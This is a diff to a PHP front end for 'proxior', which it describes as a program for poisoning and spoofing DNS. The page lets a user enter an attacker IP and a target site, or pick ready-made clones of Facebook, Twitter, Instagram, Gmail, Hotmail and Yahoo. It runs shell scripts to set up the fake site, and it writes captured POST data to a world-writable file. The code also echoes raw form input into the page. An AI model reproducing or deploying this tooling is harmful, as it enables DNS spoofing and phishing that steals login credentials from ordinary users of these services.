@@ -1,7 +1,30 @@
 <?php
 
+/*
+*  Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
+*  proxior is a program for poisoning and spoofing dns.
+*
+*  proxior is free software: you can redistribute it and/or modify
+*  it under the terms of the GNU Affero General Public License as published by
+*  the Free Software Foundation, either version 3 of the License, or
+*  (at your option) any later version.
+*
+*  proxior is distributed in the hope that it will be useful,
+*  but WITHOUT ANY WARRANTY; without even the implied warranty of
+*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+*  GNU Affero General Public License for more details.
+*
+*  You should have received a copy of the GNU Affero General Public License
+*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
+*
+*/
 
-clearstatcache();
+
+  session_start();
+
+  clearstatcache();
+
+  opcache_reset();
 
 
    $ip_redirection = shell_exec('shell/./my_ipv4.sh');
@@ -72,7 +95,7 @@ clearstatcache();
 <html>
 <head>
 
-   <title> clonenew </title>
+   <title> proxior </title>
   
   <link rel="icon" type="image/jpg" href="/css/clone_title.jpg" />
 
@@ -106,54 +129,43 @@ $(document).ready(function(){
 
 
 
-    <div class="shell-wrap">
-  <p class="shell-top-bar"> Instructions for use </p>
+     <div class="shell-wrap">
+     <p class="shell-top-bar"> 
+      <?php
+         $output = shell_exec('shell/getaway_ip.sh');
+         echo "<a class='a' href='//$output' target='_blank'> Create Fake Dns </a>";
+        ?>       
+      </p>
   
      <br>
-
-   <div align="center">
-      <font color="black">
-      1) insert a name of a web site and press enter <br>
-      2) The web site it must have http or https protocol <br>
-       Right: http://www.example.com or http://example.com <br>
-       Wrong: www.example.com or example.com <br>
-         </font>
-    </div>
-  
-  <br><br>
 
 
   <div align="center">
  <form action="" method="post" id="form1">
   <!--  <font color="black"> <h2> Hack http web sites </h2> </font> -->
   
-  <font color="black">  < </font>
-
-     <input type="text" name="ip_addr" id="ip" minlength="7" maxlength="15" 
-  placeholder="<?php echo 'Ip address of attacker'; ?>" 
-  value="<?php $attacker_ip = shell_exec('shell/./my_ipv4.sh'); sleep(2); echo $attacker_ip; ?>" 
-readonly required> 
-
-      <font color="black"> > </font>
+  <font color="white">  < </font>
+     <input type="text" name="ip_addr" id="ip" minlength="7" maxlength="15" placeholder="Ip address of attacker"  autofocus required> 
+      <font color="white"> > </font>
       <br><br>
-      <font color="black"> < </font> 
- <input type="text" name="site_hack" minlength="3" maxlength="50" placeholder="Enter a web site ec: http://www.website.com"  
+      <font color="white"> < </font> 
+ <input type="text" name="site_hack" minlength="7" maxlength="256" placeholder="Enter a web site ec: http://www.website.com"  
    id="site" required>  
-        <font color="black"> > </font>
+        <font color="white"> > </font>
       <br> 
      <br>
    <input type="submit" name="hack" value="Hach this site" id="submit"> 
   </form>
     </div>
 
-      <br>
+     <br>
 
      <div align="center"> 
-      <h3> <font color="black"> Or she used a ready </font> </h3>
+      <h3> <font color="white"> Or she used a ready </font> </h3>
      </div>
 
 
-         <br><br>
+         <br>
 
 
 
@@ -162,34 +174,106 @@ readonly required>
    <select name="site_ready" id="select_site" onchange="this.form.submit()">
     <option selected disabled> Ready websites </option>
      <optgroup label="Social Media">
-      <option value ="https://www.facebook.com_pc"> Facebook (PC) </option>
-      <option value ="https://www.facebook.com_tablet_mobile"> Facebook (tablet - mobile) </option>
-      <option value ="https://www.instagram.com"> Instagram </option>
-      <option value ="https://www.twitter.com"> Twitter </option>
-     </optgroup>
+    <option value ="https://www.facebook.com">  &#120125; &nbsp; Facebook </option>
+    <option value ="https://www.twitter.com"> &#120139; &nbsp; Twitter </option>
+    <option value ="https://www.instagram.com"> &#120128; &nbsp; Instagram </option>
+      </optgroup>
 
      <option disabled> </option>
 
        <optgroup label="Email">
-    <option value ="https://www.gmail.com"> Gmail </option>
-    <option value ="https://login.live.com"> Hotmail </option>
-    <option value ="https://www.yahoo.com"> Yahoo </option>
+    <option value ="https://www.gmail.com"> &#120126; &nbsp; Gmail </option>
+    <option value ="https://login.live.com"> &#8461; &nbsp; Hotmail </option>
+    <option value ="https://www.yahoo.com"> &#120144; &nbsp; Yahoo </option>
       </optgroup>
   </select>
   </form>
+
+
+<?php
+
+ require_once('__SRC__/class_attack_details.php');
+
+  if (class_exists('ATTACK_DETAILS')) 
+    {
+     $OBJ_ATTACK_DETAILS = new ATTACK_DETAILS;
+
+     $CONNECTED      =  $OBJ_ATTACK_DETAILS -> DETAILS[0];
+     $PROTOCOL_PORT  =  $OBJ_ATTACK_DETAILS -> DETAILS[1];
+     $DNS_CONDITION  =  $OBJ_ATTACK_DETAILS -> DETAILS[2];
+     $TIME           =  date($OBJ_ATTACK_DETAILS::CONSTANT);   
+  
+   ob_flush();
+
+    echo"<table>
+	  <thead>
+
+           <tr>
+	    <th> Connected </th>
+            <th> Protocol & port </th>
+	    <th> Dns condition </th>
+	    <th> Website </th>
+	    <th> Time </th>
+          </tr>";
+
+
+   if(isset($_POST['hack']))
+    {
+     echo" <tr>
+	    <th> $CONNECTED </th>
+	    <th> $PROTOCOL_PORT </th>
+	    <th> $DNS_CONDITION </th>
+	    <th> {$_POST['site_hack']}  </th>
+	   <th>  $TIME  </th>
+          </tr>
+
+	</thead>
+       </table>";
+       }
+ 
+
+   else if (isset($_POST['site_ready']))
+         {
+          echo" <tr>
+	    <th> $CONNECTED </th>
+	    <th> $PROTOCOL_PORT </th>
+	    <th> $DNS_CONDITION </th>
+	    <th> {$_POST['site_ready']}  </th>
+	   <th>  $TIME  </th>
+          </tr>
+
+	</thead>
+       </table>";
+           }
+
+
+
+ob_end_flush();
+flush();
+usleep(3000000);
+
+
+
+ } // end of class exists
+
+
+
+	
+?>
+
+
+
+
     </div>
 
 
   
     
-
-
 <!--
-    <div id="footer">
+  <div id="footer">
    <img src="/css/clone_diagram.jpg" height="250" width="600">
-    </div> 
-  -->
-  
+   </div>
+  --> 
 
 
 
@@ -203,8 +287,6 @@ readonly required>
 
 <?php
 
-  session_start();
-
 
   require_once('__SRC__/class_tools.php');
 
@@ -212,9 +294,6 @@ readonly required>
     {
     $obj_data = new INPUT_DATA_AVAILABLE;
       
-
-
-
 
 
 
@@ -228,7 +307,7 @@ readonly required>
    if (filter_var($ip_addr, FILTER_VALIDATE_IP) == true) 
        {
 
-    $get_ip = shell_exec('shell/./my_ipv4.sh');
+    $get_ip = shell_exec('./my_ipv4.sh');
  
      if ($get_ip = $ip_addr)
        {
@@ -255,7 +334,7 @@ readonly required>
     fclose($post_data_txt);
 
  
-     chmod("/var/www/clonenew/export/data.txt", 0777);
+     chmod("/var/www/proxior/export/data.txt", 0777);
 
 
 
@@ -270,12 +349,12 @@ readonly required>
     fclose($post_file_php);
 
 
-      chmod("/var/www/clonenew/post.php", 0777);
+      chmod("/var/www/proxior/post.php", 0777);
 
 
 
 
-      chmod("/var/www/clonenew/index.html", 0777);
+      chmod("/var/www/proxior/index.html", 0777);
 
 
   $path_to_file = 'index.html';
@@ -284,8 +363,8 @@ readonly required>
   file_put_contents($path_to_file,$file_contents);
 
 
-//  echo '<script type="text/javascript">alert("The website hack successfully");
-     //    </script>';
+ // echo '<script type="text/javascript">alert("The website hack successfully");
+  //       </script>';
           echo ("<script>location.href='dns.php'</script>");
 
           } // end of parity ip
@@ -303,17 +382,14 @@ readonly required>
 
    else if (filter_var($ip_addr, FILTER_VALIDATE_IP) != true)
      {
-//echo '<script type="text/javascript">alert("The website hack fail: Try again");
-         //</script>';
+echo '<script type="text/javascript">alert("The website hack fail: Try again");
+         </script>';
      echo ("<script>location.href='index.php'</script>");
       }   
 
 
 
  } // kleisimo ths isset
-
-
-
 
 
 
@@ -333,59 +409,24 @@ readonly required>
   
 
       $post_data_txt_site_ready = fopen("export/data.txt", "w");
-      chmod("/var/www/clonenew/export/data.txt", 0777);
+      chmod("/var/www/proxior/export/data.txt", 0777);
 
 
-
-    if ($site_ready=='https://www.facebook.com_pc')
+    if ($site_ready=='https://www.facebook.com')
        {
 
     shell_exec('shell/./permissions.sh');
-    shell_exec('shell/./facebook_pc.sh');
+    shell_exec('shell/./facebook.sh');
 
+ 
 
-
-   // echo '<script type="text/javascript">alert("Facebook for PC hack successfully");
+   // echo '<script type="text/javascript">alert("Facebook hack successfully");
     //  </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
-    } // end if of facebook pc
+    } // end if of facebook
 
-
-
-  else if ($site_ready=='https://www.facebook.com_tablet_mobile')
-        {
-
-    shell_exec('shell/./permissions.sh');
-    shell_exec('shell/./facebook_tablet_mobile.sh');
-
-
-
-    //echo '<script type="text/javascript">alert("Facebook for tablet - mobile hack successfully");
-     // </script>';
-     echo ("<script>location.href='dns.php'</script>");
-     
-
-    } // end if of facebook tablet - mobile
-
-
-
-
-   else if ($site_ready=='https://www.instagram.com')
-       {
-
-    shell_exec('shell/./permissions.sh');
-    shell_exec('shell/./instagram.sh');
-
-
-
-    //echo '<script type="text/javascript">alert("Instagram hack successfully");
-     // </script>';
-     echo ("<script>location.href='dns.php'</script>");
-     
-
-    } // end if of instagram
 
 
 
@@ -396,14 +437,30 @@ readonly required>
     shell_exec('shell/./twitter.sh');
 
 
-
    // echo '<script type="text/javascript">alert("Twitter hack successfully");
-     // </script>';
+   //   </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
     } // end if of twitter
 
+
+
+
+      else if ($site_ready=='https://www.instagram.com')
+       {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./instagram.sh');
+
+
+
+   // echo '<script type="text/javascript">alert("Instagram hack successfully");
+   //   </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of instagram
 
 
 
@@ -416,8 +473,8 @@ readonly required>
 
 
 
-   // echo '<script type="text/javascript">alert("Gmail hack successfully");
-     // </script>';
+    // echo '<script type="text/javascript">alert("Gmail hack successfully");
+    //  </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
@@ -435,7 +492,7 @@ readonly required>
 
 
    // echo '<script type="text/javascript">alert("Hotmail hack successfully");
-     // </script>';
+   //   </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
@@ -446,7 +503,7 @@ readonly required>
 
 
 
-        if ($site_ready=='https://www.yahoo.com')
+     if ($site_ready=='https://www.yahoo.com')
        {
 
     shell_exec('shell/./permissions.sh');
@@ -455,7 +512,7 @@ readonly required>
 
 
    // echo '<script type="text/javascript">alert("Yahoo hack successfully");
-     // </script>';
+   //   </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
